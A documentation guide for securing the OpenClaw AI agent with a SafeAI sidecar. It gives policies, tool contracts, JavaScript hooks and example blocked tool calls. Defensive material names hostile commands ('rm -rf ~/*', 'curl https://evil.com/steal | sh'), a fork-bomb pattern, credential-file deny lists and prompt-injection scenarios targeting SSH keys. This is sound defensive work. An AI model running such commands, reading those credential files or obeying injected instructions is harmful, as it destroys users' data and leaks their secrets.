# Securing OpenClaw with SafeAI

[OpenClaw](https://openclaw.ai/) is an open-source personal AI assistant that runs locally on your machine. It connects to WhatsApp, Telegram, Slack, Discord, Signal, iMessage, and more — executing real actions like browsing the web, running shell commands, reading and writing files, sending emails via Gmail, and managing GitHub repos.

That power is exactly why it needs SafeAI. An autonomous agent with shell access, file system permissions, and messaging capabilities is one prompt injection away from leaking credentials, sending PII to the wrong chat, or running `rm -rf` on your home directory.

This guide shows how to run SafeAI as a sidecar alongside OpenClaw so every tool call, every outbound message, and every model response is scanned and enforced — without modifying OpenClaw's source code.

---

## Why OpenClaw needs guardrails

OpenClaw's agent can:

| Capability | Risk |
|:---|:---|
| Execute shell commands (`bash`) | `rm -rf ~`, `curl ... \| sh`, credential exfil |
| Read/write files | Access `.env`, `~/.ssh/id_rsa`, `~/.aws/credentials` |
| Browse the web (Playwright/CDP) | Navigate to phishing pages, leak session cookies |
| Send messages (WhatsApp, Telegram, Slack, etc.) | Forward PII or secrets to unintended recipients |
| Gmail Pub/Sub integration | Read/send email with your real inbox |
| GitHub integration | Push code, create repos, expose tokens |
| Cron jobs and webhooks | Persistent backdoor tasks |

A single prompt injection — via an incoming DM, a webpage the agent visits, or a file it reads — could exploit any of these. SafeAI sits between OpenClaw and these tools to enforce policy at every boundary.

---

## Architecture

OpenClaw is a Node.js/TypeScript application. SafeAI is Python. The integration uses SafeAI's **REST proxy** running as a sidecar — OpenClaw calls SafeAI's HTTP API before and after tool execution.

```
                         ┌─────────────────┐
  User (WhatsApp,        │                 │        ┌──────────────┐
  Telegram, Slack,  ───> │    OpenClaw      │ ─────> │  AI Provider │
  Discord, etc.)         │    Gateway       │ <───── │  (Claude,    │
                         │  ws://127.0.0.1  │        │   OpenAI)    │
                         │     :18789       │        └──────────────┘
                         │                 │
                         │   Tool calls ────┼──────> ┌──────────────┐
                         │   (bash, file,   │        │   SafeAI     │
                         │    browser,      │ <───── │   Sidecar    │
                         │    messaging)    │        │  :8484       │
                         └─────────────────┘        └──────────────┘
                                                         │
                                                    Policy Engine
                                                    Audit Logger
                                                    Secret Scanner
                                                    PII Detector
```

SafeAI runs on `localhost:8484`. OpenClaw calls it via HTTP before executing any tool and after receiving any model response.

---

## Step 1 — Install both

```bash
# Install OpenClaw
npm install -g openclaw@latest
openclaw onboard --install-daemon

# Install SafeAI
uv pip install safeai

# Scaffold SafeAI config in your workspace
cd ~/openclaw-workspace
safeai init --path .
```

---

## Step 2 — Configure SafeAI policies for OpenClaw

Replace the default policies with rules tailored to an autonomous personal assistant.

```yaml title="policies/openclaw.yaml"
policies:
  # ── SECRETS ─────────────────────────────────────────
  # Block secrets at every boundary. This is the most critical rule.
  - name: block-secrets-everywhere
    boundary: [input, action, output]
    priority: 10
    condition:
      data_tags: [secret]
    action: block
    reason: "Credentials, API keys, and tokens must never cross any boundary."

  # ── PII ─────────────────────────────────────────────
  # Block PII from reaching the model
  - name: block-pii-to-model
    boundary: [input]
    priority: 20
    condition:
      data_tags: [personal.pii]
    action: block
    reason: "PII must not be sent to the model."

  # Redact PII in model responses
  - name: redact-pii-in-responses
    boundary: [output]
    priority: 20
    condition:
      data_tags: [personal.pii]
    action: redact
    reason: "PII must be redacted before displaying to the user."

  # ── DANGEROUS COMMANDS ──────────────────────────────
  # Block destructive shell commands (rm -rf, DROP TABLE, etc.)
  - name: block-dangerous-commands
    boundary: [action]
    priority: 15
    condition:
      data_tags: [destructive]
    action: block
    reason: "Destructive commands are not allowed."

  # ── EXTERNAL ACTIONS ────────────────────────────────
  # Require human approval for messaging and email
  - name: approve-outbound-messages
    boundary: [action]
    priority: 30
    condition:
      data_tags: [external.messaging]
    action: require_approval
    reason: "Outbound messages require user approval."

  # Require approval for git push and GitHub operations
  - name: approve-git-push
    boundary: [action]
    priority: 30
    condition:
      data_tags: [external.git]
    action: require_approval
    reason: "Git push operations require user approval."

  # ── FILE SYSTEM ─────────────────────────────────────
  # Block access to sensitive file paths
  - name: block-sensitive-files
    boundary: [action]
    priority: 12
    condition:
      data_tags: [sensitive.filesystem]
    action: block
    reason: "Access to credential files and private keys is denied."

  # ── DEFAULT ALLOW ───────────────────────────────────
  - name: allow-everything-else
    boundary: [input, action, output]
    priority: 1000
    condition: {}
    action: allow
    reason: "Allow when no restrictive policy matched."
```

---

## Step 3 — Define tool contracts for OpenClaw's capabilities

```yaml title="contracts/openclaw.yaml"
contracts:
  # Shell execution — most dangerous tool
  - tool_name: bash
    allowed_request_tags: [internal]
    allowed_response_fields: [stdout, stderr, exit_code]

  # File operations
  - tool_name: file_read
    allowed_request_tags: [internal]
    allowed_response_fields: [content, path, size]

  - tool_name: file_write
    allowed_request_tags: [internal]
    allowed_response_fields: [path, bytes_written, status]

  # Browser automation
  - tool_name: browser
    allowed_request_tags: [internal]
    allowed_response_fields: [url, title, content, screenshot]

  # Messaging (WhatsApp, Telegram, Slack, etc.)
  - tool_name: send_message
    allowed_request_tags: [external.messaging, personal.pii]
    allowed_response_fields: [message_id, status, channel]

  # Gmail
  - tool_name: gmail_send
    allowed_request_tags: [external.messaging, personal.pii]
    allowed_response_fields: [message_id, status]

  # GitHub
  - tool_name: github_push
    allowed_request_tags: [external.git]
    allowed_response_fields: [commit_sha, branch, status]

  # Cron / webhooks
  - tool_name: cron_create
    allowed_request_tags: [internal]
    allowed_response_fields: [job_id, schedule, status]
```

---

## Step 4 — Start SafeAI sidecar

```bash
safeai serve --mode sidecar --port 8484 --config safeai.yaml
```

SafeAI is now running at `http://127.0.0.1:8484` and ready to enforce policies.

---

## Step 5 — Build the OpenClaw SafeAI skill

OpenClaw uses a **skills** system for extensibility. Create a SafeAI skill that intercepts tool calls via the sidecar API.

```javascript title="skills/safeai-guard/index.js"
// SafeAI Guard — OpenClaw skill that enforces SafeAI policies
// on every tool call, inbound message, and model response.

const SAFEAI_URL = process.env.SAFEAI_URL || "http://127.0.0.1:8484";

/**
 * Scan text before it reaches the model (input boundary).
 */
async function scanInput(text, agentId = "openclaw") {
  const res = await fetch(`${SAFEAI_URL}/v1/scan/input`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ text, agent_id: agentId }),
  });
  return res.json();
}

/**
 * Guard model output before displaying to user (output boundary).
 */
async function guardOutput(text, agentId = "openclaw") {
  const res = await fetch(`${SAFEAI_URL}/v1/guard/output`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ text, agent_id: agentId }),
  });
  return res.json();
}

/**
 * Intercept a tool call before execution (action boundary).
 */
async function interceptTool(toolName, params, dataTags, agentId = "openclaw") {
  const res = await fetch(`${SAFEAI_URL}/v1/intercept/tool`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      tool_name: toolName,
      parameters: params,
      data_tags: dataTags,
      agent_id: agentId,
    }),
  });
  return res.json();
}

/**
 * Scan a structured JSON payload (e.g., webhook data).
 */
async function scanStructured(payload, agentId = "openclaw") {
  const res = await fetch(`${SAFEAI_URL}/v1/scan/structured`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ payload, agent_id: agentId }),
  });
  return res.json();
}

module.exports = { scanInput, guardOutput, interceptTool, scanStructured };
```

---

## Step 6 — Wire SafeAI into OpenClaw's tool pipeline

Create a wrapper that checks SafeAI before every tool executes. This is the core integration point.

```javascript title="skills/safeai-guard/hooks.js"
const { scanInput, guardOutput, interceptTool } = require("./index");

// ── Sensitive file paths that should never be read or written ──
const SENSITIVE_PATHS = [
  ".env", ".env.local", ".env.production",
  ".ssh/", ".aws/credentials", ".gnupg/",
  ".config/gh/hosts.yml", ".npmrc", ".pypirc",
  ".netrc", "id_rsa", "id_ed25519",
];

function isSensitivePath(filepath) {
  const normalized = filepath.replace(/^~\//, "").toLowerCase();
  return SENSITIVE_PATHS.some(
    (p) => normalized.includes(p) || normalized.endsWith(p)
  );
}

// ── Tag inference based on tool name and parameters ──
function inferTags(toolName, params) {
  const tags = [];

  // Messaging tools
  if (["send_message", "gmail_send"].includes(toolName)) {
    tags.push("external.messaging");
    // Check if PII is in the message body
    if (params.body || params.text || params.content) {
      tags.push("personal.pii"); // SafeAI will scan and confirm
    }
  }

  // Git operations
  if (toolName === "github_push" || (toolName === "bash" && /git\s+push/.test(params.command))) {
    tags.push("external.git");
  }

  // Destructive commands
  if (toolName === "bash") {
    const cmd = (params.command || "").toLowerCase();
    if (
      /rm\s+(-rf?|--recursive)/.test(cmd) ||
      /drop\s+(table|database)/i.test(cmd) ||
      /mkfs\./.test(cmd) ||
      /:\(\)\s*\{/.test(cmd) ||        // fork bomb
      /curl.*\|\s*(ba)?sh/.test(cmd) ||  // pipe to shell
      /wget.*\|\s*(ba)?sh/.test(cmd)
    ) {
      tags.push("destructive");
    }
  }

  // Sensitive file access
  if (["file_read", "file_write"].includes(toolName)) {
    if (isSensitivePath(params.path || "")) {
      tags.push("sensitive.filesystem");
    }
  }

  // Default to internal if no external tags
  if (tags.length === 0) {
    tags.push("internal");
  }

  return tags;
}

/**
 * Pre-tool hook: runs BEFORE OpenClaw executes any tool.
 * Returns { allowed: bool, reason: string, filtered_params: object }
 */
async function beforeToolExecution(toolName, params) {
  const tags = inferTags(toolName, params);
  const result = await interceptTool(toolName, params, tags);
  const decision = result.decision || {};

  if (decision.action === "block") {
    return {
      allowed: false,
      reason: `SafeAI blocked ${toolName}: ${decision.reason}`,
      filtered_params: params,
    };
  }

  if (decision.action === "require_approval") {
    return {
      allowed: false,
      reason: `SafeAI requires approval for ${toolName}: ${decision.reason}. `
        + `Run: safeai approvals list --status pending`,
      filtered_params: params,
    };
  }

  return {
    allowed: true,
    reason: "allowed",
    filtered_params: result.filtered_params || params,
  };
}

/**
 * Pre-model hook: scans inbound messages before the model sees them.
 */
async function beforeModelCall(userMessage) {
  const result = await scanInput(userMessage);
  const decision = result.decision || {};

  if (decision.action === "block") {
    return {
      allowed: false,
      reason: `SafeAI blocked input: ${decision.reason}`,
      filtered: result.filtered || userMessage,
    };
  }

  return {
    allowed: true,
    reason: "allowed",
    filtered: result.filtered || userMessage,
  };
}

/**
 * Post-model hook: guards model output before displaying to user.
 */
async function afterModelCall(modelResponse) {
  const result = await guardOutput(modelResponse);
  return {
    safe_output: result.safe_output || modelResponse,
    action: (result.decision || {}).action || "allow",
  };
}

module.exports = {
  beforeToolExecution,
  beforeModelCall,
  afterModelCall,
  inferTags,
};
```

---

## Step 7 — See it in action

Start both services:

```bash
# Terminal 1: SafeAI sidecar
safeai serve --mode sidecar --port 8484 --config safeai.yaml

# Terminal 2: OpenClaw
openclaw start
```

### Scenario 1: Dangerous shell command blocked

A user (or prompt injection) asks the agent to run a destructive command.

```bash
# From any connected channel (WhatsApp, Slack, etc.):
> "Clean up disk space by running: rm -rf ~/*"
```

SafeAI intercepts the `bash` tool call:

```json
POST /v1/intercept/tool
{
  "tool_name": "bash",
  "parameters": { "command": "rm -rf ~/*" },
  "data_tags": ["destructive"],
  "agent_id": "openclaw"
}

Response:
{
  "decision": {
    "action": "block",
    "policy_name": "block-dangerous-commands",
    "reason": "Destructive commands are not allowed."
  }
}
```

The agent responds: *"I can't execute that command — it's been flagged as destructive by SafeAI."*

### Scenario 2: Credential exfiltration blocked

A prompt injection hidden in a webpage tells the agent to read your SSH key.

```json
POST /v1/intercept/tool
{
  "tool_name": "file_read",
  "parameters": { "path": "~/.ssh/id_ed25519" },
  "data_tags": ["sensitive.filesystem"],
  "agent_id": "openclaw"
}

Response:
{
  "decision": {
    "action": "block",
    "policy_name": "block-sensitive-files",
    "reason": "Access to credential files and private keys is denied."
  }
}
```

### Scenario 3: API key in inbound message blocked

Someone sends you a message containing a secret, and the agent tries to forward it to the model.

```json
POST /v1/scan/input
{
  "text": "Hey, use this key: sk-proj-abc123def456 for the API",
  "agent_id": "openclaw"
}

Response:
{
  "decision": {
    "action": "block",
    "policy_name": "block-secrets-everywhere",
    "reason": "Credentials, API keys, and tokens must never cross any boundary."
  }
}
```

### Scenario 4: PII redacted in model response

The model generates a response containing a phone number.

```json
POST /v1/guard/output
{
  "text": "I found your contact: John at 555-867-5309 and john@example.com",
  "agent_id": "openclaw"
}

Response:
{
  "decision": { "action": "redact" },
  "safe_output": "I found your contact: John at [REDACTED] and [REDACTED]"
}
```

### Scenario 5: Outbound message requires approval

The agent tries to send a WhatsApp message. The policy requires human approval.

```json
POST /v1/intercept/tool
{
  "tool_name": "send_message",
  "parameters": {
    "channel": "whatsapp",
    "to": "+1-555-123-4567",
    "body": "Here's the document you requested."
  },
  "data_tags": ["external.messaging"],
  "agent_id": "openclaw"
}

Response:
{
  "decision": {
    "action": "require_approval",
    "policy_name": "approve-outbound-messages",
    "reason": "Outbound messages require user approval."
  }
}
```

Approve from the CLI:

```bash
safeai approvals list --status pending
safeai approvals approve req_abc123 --approver user --note "Looks good"
```

### Scenario 6: Git push requires approval

```json
POST /v1/intercept/tool
{
  "tool_name": "bash",
  "parameters": { "command": "git push origin main" },
  "data_tags": ["external.git"],
  "agent_id": "openclaw"
}

Response:
{
  "decision": {
    "action": "require_approval",
    "reason": "Git push operations require user approval."
  }
}
```

---

## Step 8 — Monitor with the audit trail

Every decision is logged. Use the CLI to investigate.

```bash
# What did SafeAI block in the last hour?
safeai logs --action block --last 1h

# All tool interceptions
safeai logs --boundary action --tail 50

# Grep for destructive command attempts
safeai logs --action block --last 24h --json-output | grep destructive

# Export full audit trail for review
safeai logs --last 7d --json-output > weekly-audit.jsonl
```

Or query via the API:

```bash
curl -s -X POST http://127.0.0.1:8484/v1/audit/query \
  -H "content-type: application/json" \
  -d '{"action": "block", "limit": 20}'
```

---

## Step 9 — Structured payload scanning for webhooks

OpenClaw supports webhooks that receive JSON payloads from external services. Scan them before the agent processes them.

```javascript
const { scanStructured } = require("./skills/safeai-guard/index");

// Incoming webhook from a CRM or form submission
const webhookPayload = {
  event: "new_lead",
  lead: {
    name: "Alice Johnson",
    email: "alice@example.com",
    phone: "555-867-5309",
    company: "Acme Corp",
  },
  metadata: {
    source: "landing_page",
    api_key: "sk-live-abc123",  // accidentally included
  },
};

const result = await scanStructured(webhookPayload);
console.log(result.decision.action);
// => "block" (secret detected in metadata.api_key)

for (const d of result.detections) {
  console.log(`  ${d.path}: ${d.tag}`);
}
// => metadata.api_key: secret.credential
// => lead.email: personal.pii
// => lead.phone: personal.pii
```

---

## Step 10 — Metrics and observability

SafeAI exposes Prometheus-style metrics.

```bash
curl -s http://127.0.0.1:8484/v1/metrics
```

```
# HELP safeai_requests_total Total boundary evaluations
# TYPE safeai_requests_total counter
safeai_requests_total{boundary="input",action="block"} 23
safeai_requests_total{boundary="input",action="allow"} 1847
safeai_requests_total{boundary="action",action="block"} 8
safeai_requests_total{boundary="action",action="require_approval"} 12
safeai_requests_total{boundary="output",action="redact"} 156
safeai_requests_total{boundary="output",action="allow"} 2034
```

---

## Step 11 — Use the Intelligence Layer

SafeAI's intelligence layer provides AI advisory agents that help you configure, monitor, and improve your OpenClaw security setup. The agents never see raw secrets or PII — they work on metadata, code structure, and audit aggregates only.

### Enable the intelligence backend

Add the intelligence section to your `safeai.yaml`:

```yaml title="safeai.yaml (add to existing config)"
intelligence:
  enabled: true
  backend:
    provider: ollama              # free, local, no API key needed
    model: llama3.2
    base_url: http://localhost:11434
  max_events_per_query: 500
  metadata_only: true
```

!!! tip
    You can use any OpenAI-compatible backend instead of Ollama. Set `provider: openai-compatible`, point `base_url` at your provider, and set `api_key_env` to the environment variable holding your key.

### Auto-generate SafeAI config from your OpenClaw workspace

Instead of writing policies and contracts by hand (Steps 2–3), let the auto-config agent analyze your workspace and generate everything:

```bash
safeai intelligence auto-config \
  --path ~/openclaw-workspace \
  --output-dir .safeai-generated
```

This scans your project's file names, imports, dependencies, and structure — then generates a complete `safeai.yaml`, policies, contracts, and agent identity files tailored to OpenClaw.

Review the output before applying:

```bash
# Review what was generated
ls .safeai-generated/
cat .safeai-generated/safeai.yaml
cat .safeai-generated/policies/generated.yaml

# Apply when satisfied
safeai intelligence auto-config \
  --path ~/openclaw-workspace \
  --output-dir .safeai-generated \
  --apply
```

### Explain a security incident

When SafeAI blocks something, the audit log records it. Use the intelligence layer to understand what happened and why:

```bash
# Find the event ID from the audit trail
safeai logs --action block --last 1h

# Ask the AI to classify and explain it
safeai intelligence explain evt_a1b2c3d4
```

Example output:

```
Classification: CREDENTIAL_EXFILTRATION
Severity: CRITICAL

Explanation:
The agent attempted to read ~/.ssh/id_ed25519 via the file_read tool.
This matches a known prompt injection pattern where an attacker instructs
the agent to exfiltrate private keys. The "block-sensitive-files" policy
correctly prevented the read.

Suggested remediation:
- Review the conversation history for the session that triggered this event
- Check inbound messages for hidden instructions (prompt injection)
- Consider adding the source channel to a watch list
```

### Get policy recommendations from audit data

After running for a while, the recommender agent analyzes your audit aggregates and suggests improvements:

```bash
safeai intelligence recommend --since 7d --output-dir .safeai-generated
```

Example recommendations:

```
Gap Analysis:
- 47 block events for "secret" tags but no redact fallback policy.
  Recommendation: Add a redact policy for secrets in output boundary
  so partial leaks are caught even if block fails upstream.

- 12 "require_approval" events for send_message but 0 for gmail_send.
  Both are external messaging tools — consider applying the same
  approval policy to gmail_send.

- No policy covers the "browser" tool's screenshot response field.
  Screenshots could contain PII rendered on screen.

Generated file: .safeai-generated/policies/recommended.yaml
```

### Generate compliance policies

If your OpenClaw deployment handles regulated data, generate a compliance policy set:

```bash
# HIPAA for healthcare data
safeai intelligence compliance --framework hipaa --output-dir .safeai-generated

# GDPR for EU user data
safeai intelligence compliance --framework gdpr --output-dir .safeai-generated

# SOC 2 for enterprise
safeai intelligence compliance --framework soc2 --output-dir .safeai-generated
```

### Use the proxy intelligence endpoints

The sidecar exposes intelligence endpoints for programmatic access:

```bash
# Check if intelligence is available
curl http://127.0.0.1:8484/v1/intelligence/status

# Explain an incident via API
curl -X POST http://127.0.0.1:8484/v1/intelligence/explain \
  -H "content-type: application/json" \
  -d '{"event_id": "evt_a1b2c3d4"}'

# Get policy recommendations via API
curl -X POST http://127.0.0.1:8484/v1/intelligence/recommend \
  -H "content-type: application/json" \
  -d '{"since": "7d"}'
```

---

## What SafeAI prevents

| Threat | Without SafeAI | With SafeAI |
|:---|:---|:---|
| `rm -rf ~/` via prompt injection | Files deleted | **Blocked** — destructive command policy |
| Agent reads `~/.ssh/id_rsa` | Private key exposed to model | **Blocked** — sensitive filesystem policy |
| API key in inbound WhatsApp message | Key forwarded to Claude/OpenAI | **Blocked** — secret detection |
| Model hallucinates phone number | PII shown to user | **Redacted** — output guard |
| Agent sends WhatsApp message autonomously | Message sent without consent | **Held** — requires user approval |
| `git push` to public repo | Code pushed without review | **Held** — requires user approval |
| `curl https://evil.com/steal \| sh` | Arbitrary code execution | **Blocked** — destructive command policy |
| Webhook payload contains leaked API key | Key reaches the model context | **Blocked** — structured scanning |
| Agent reads `.env` for "troubleshooting" | Env vars (secrets) exposed | **Blocked** — sensitive filesystem policy |

---

## Running both as system services

For always-on operation, run SafeAI alongside OpenClaw's daemon.

```bash title="Start SafeAI as a background service"
# Using systemd (Linux)
cat > ~/.config/systemd/user/safeai.service << 'EOF'
[Unit]
Description=SafeAI Sidecar for OpenClaw
After=network.target

[Service]
ExecStart=safeai serve --mode sidecar --port 8484 --config %h/openclaw-workspace/safeai.yaml
Restart=always

[Install]
WantedBy=default.target
EOF

systemctl --user enable --now safeai

# Using launchd (macOS)
cat > ~/Library/LaunchAgents/com.safeai.sidecar.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.safeai.sidecar</string>
  <key>ProgramArguments</key>
  <array>
    <string>safeai</string>
    <string>serve</string>
    <string>--mode</string>
    <string>sidecar</string>
    <string>--port</string>
    <string>8484</string>
    <string>--config</string>
    <string>safeai.yaml</string>
  </array>
  <key>WorkingDirectory</key>
  <string>/Users/you/openclaw-workspace</string>
  <key>KeepAlive</key>
  <true/>
</dict>
</plist>
EOF

launchctl load ~/Library/LaunchAgents/com.safeai.sidecar.plist
```

---

## Summary

SafeAI and OpenClaw work together naturally:

- **OpenClaw** is the agent runtime — it reasons, plans, and calls tools
- **SafeAI** is the security layer — it enforces policy at every boundary

You didn't modify a single line of OpenClaw's source code. SafeAI runs as a sidecar, and the OpenClaw skill calls it via HTTP before every tool execution and after every model response.

The key integration points:

1. **Input boundary** — `POST /v1/scan/input` before the model sees any message
2. **Action boundary** — `POST /v1/intercept/tool` before any tool executes
3. **Output boundary** — `POST /v1/guard/output` before any response is shown
4. **Structured scanning** — `POST /v1/scan/structured` for webhook payloads
5. **Approvals** — `safeai approvals` CLI for human-in-the-loop gates
6. **Audit** — `safeai logs` and `/v1/audit/query` for full decision trail
7. **Intelligence** — `safeai intelligence` for AI-powered config generation, incident explanation, policy recommendations, and compliance mapping

---

## Next steps

- [SafeAI Installation](../getting-started/installation.md) — get SafeAI running
- [Proxy / Sidecar Guide](../integrations/proxy-sidecar.md) — full REST API reference
- [Policy Engine](../guides/policy-engine.md) — design custom rules
- [Dangerous Commands](../guides/dangerous-commands.md) — destructive command detection
- [Approval Workflows](../guides/approval-workflows.md) — human-in-the-loop gates
- [Intelligence Layer](../guides/intelligence.md) — AI advisory agents for config generation, incident analysis, and compliance
- [OpenClaw Documentation](https://github.com/openclaw/openclaw) — OpenClaw setup and skills
